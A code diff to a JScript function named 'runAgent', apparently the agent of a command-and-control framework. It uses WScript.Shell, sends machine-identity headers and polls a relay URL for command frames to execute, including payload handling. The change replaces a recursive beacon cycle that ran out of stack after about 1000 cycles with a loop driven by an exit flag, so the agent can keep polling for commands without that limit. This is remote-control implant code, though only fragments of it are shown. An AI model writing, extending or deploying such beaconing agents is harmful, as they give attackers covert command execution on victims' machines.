@@ -1,5 +1,5 @@
 function runAgent() {
-    var shell = null, identityHeaders = null;
+    var shell = null, identityHeaders = null, exiting = false;
     var clrVersion = 'v4.0.30319';
     function ensureShell() {
         if (!shell) shell = new ActiveXObject('WScript.Shell');
@@ -278,8 +278,7 @@ function runAgent() {
             ? ((bytes[1] | (bytes[2] << 8) | (bytes[3] << 16) | (bytes[4] << 24)) >>> 0)
             : 0;
         function reply(status) { return u32Bytes(status).concat(u32Bytes(corrId)); }
-        // Exit (0x0A) never reaches dispatchCommand — the beacon driver intercepts it
-        // before dispatch, so this stays a pure command→reply mapping.
+        if (bytes[0] == 10) { exiting = true; return null; }
         if (bytes[0] == 11) {
             try {
                 var payloadText = '';
@@ -335,16 +334,7 @@ function runAgent() {
         if (identityHeaders[u][0] == 'X-Agent-Machine-Uuid') uuidForLog = identityHeaders[u][1];
     log('JScript agent beaconing to ' + beaconUrl + ' as ' + (uuidForLog || 'an unidentified machine'));
     var pendingReplies = [];
-    // One beacon round-trip: POST every reply owed since last time, then dispatch
-    // every queued command. There is NO loop construct driving the session and no
-    // shared exit flag — "keep going" IS the tail-call: the cycle re-invokes itself,
-    // 'exit'/'fail' unwind straight to the host. The price is deliberate: JScript
-    // does no tail-call optimization, so every cycle parks one frame on the script
-    // stack and the engine raises Out of stack space (0x800A001C) after roughly
-    // 1000+ cycles — hours at the relay's 20-30 s hold. The catch at the call site
-    // folds that ceiling into the same fatal end as any transport failure ('fail';
-    // presence comes back by re-delivery, never by a process looping on its own).
-    function beaconCycle() {
+    while (!exiting) {
         var xhr = null;
         try {
             xhr = makeTransport();
@@ -363,26 +353,15 @@ function runAgent() {
             return 'fail';
         }
         pendingReplies = [];
-        // Empty answer = nothing queued — re-POST immediately (next self-call). The
-        // stream conversion of a zero-length body throws, so gate on Content-Length,
-        // never on ''-checks.
-        if (parseInt(xhr.getResponseHeader('Content-Length') || '0', 10) == 0) { log('idle — empty answer'); return beaconCycle(); }
+        // Empty answer = nothing queued — re-POST immediately. The stream conversion
+        // of a zero-length body throws, so gate on Content-Length, never on ''-checks.
+        if (parseInt(xhr.getResponseHeader('Content-Length') || '0', 10) == 0) { log('idle — empty answer'); continue; }
         var frames = parseFrames(responseToBytes(xhr.responseBody));
-        for (var f = 0; f < frames.length; f++) {
-            // Exit (0x0A) is intercepted HERE, before dispatch: dispatchCommand stays
-            // a pure command→reply mapping and frames after Exit are never executed.
-            if (frames[f][0] == 10) { log('exit'); return 'exit'; }
+        for (var f = 0; f < frames.length && !exiting; f++) {
             var replyBytes = dispatchCommand(frames[f]);
+            if (exiting) { log('exit'); return 'exit'; }
             if (replyBytes) pendingReplies.push(replyBytes);
         }
-        return beaconCycle();
     }
-    try {
-        return beaconCycle();
-    } catch (eCycle) {
-        // Expected here: Out of stack space at the recursion ceiling (any other
-        // throw is a transport/parsing failure that used to escape uncaught).
-        log('beacon aborted: ' + (eCycle && eCycle.message ? eCycle.message : eCycle));
-        return 'fail';
-    }
+    return 'exit';
 }
